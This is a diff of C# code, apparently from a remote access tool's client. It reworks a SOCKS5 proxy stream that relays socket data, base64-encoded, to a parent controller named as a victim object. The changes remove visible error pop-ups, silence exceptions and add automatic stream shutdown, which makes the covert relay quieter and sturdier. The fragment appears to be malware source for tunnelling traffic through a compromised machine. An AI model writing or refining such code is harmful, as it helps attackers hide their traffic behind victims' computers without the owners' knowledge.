@@ -67,22 +67,20 @@ namespace winClient48
 
             if (m_sktClnt != null)
             {
-                try 
-                { 
+                try
+                {
+                    m_sktClnt.Dispose();
                     m_sktClnt.Close();
-                } 
-                catch (Exception ex) 
-                {
-                    MessageBox.Show(ex.Message);
                 }
-
-                try 
-                { 
-                    m_sktClnt.Dispose(); 
-                } 
-                catch (Exception ex)
+                finally
                 {
-                    MessageBox.Show(ex.Message);
+                    m_vicParent.fnSendCommand(new string[]
+                    {
+                        "proxy",
+                        "socks5",
+                        "close",
+                        m_nStreamId.ToString(),
+                    });
                 }
 
                 m_sktClnt = null;
@@ -103,9 +101,13 @@ namespace winClient48
                     nSent += n;
                 }
             }
+            catch (SocketException)
+            {
+                fnClose();
+            }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message);
+                
             }
 
             return true;
@@ -129,6 +131,7 @@ namespace winClient48
             catch (Exception ex)
             {
                 //MessageBox.Show(ex.Message);
+                fnClose();
             }
         }
 
@@ -139,35 +142,34 @@ namespace winClient48
                 byte[] abBuffer = new byte[8192];
                 while (m_bIsRunning)
                 {
-                    int nRecv = m_sktClnt.Receive(abBuffer);
-                    if (nRecv <= 0)
-                        break;
-
-                    string szBase64 = Convert.ToBase64String(abBuffer, 0, nRecv);
-
-                    m_vicParent.fnSendCommand(new string[]
+                    try
                     {
-                    "proxy",
-                    "socks5",
-                    "data",
-                    m_nStreamId.ToString(),
-                    szBase64
-                    });
+                        int nRecv = m_sktClnt.Receive(abBuffer);
+                        if (nRecv <= 0)
+                            break;
+
+                        string szBase64 = Convert.ToBase64String(abBuffer, 0, nRecv);
+
+                        m_vicParent.fnSendCommand(new string[]
+                        {
+                            "proxy",
+                            "socks5",
+                            "data",
+                            m_nStreamId.ToString(),
+                            szBase64,
+                        });
+                    }
+                    catch (SocketException)
+                    {
+                        fnClose();
+                    }
                 }
 
-                m_vicParent.fnSendCommand(new string[]
-                {
-                "proxy",
-                "socks5",
-                "close",
-                m_nStreamId.ToString()
-                });
-
-                m_bIsRunning = false;
+                fnClose();
             }
             catch (Exception ex)
             {
-                //MessageBox.Show(ex.Message);
+                fnClose();
             }
         }
     }
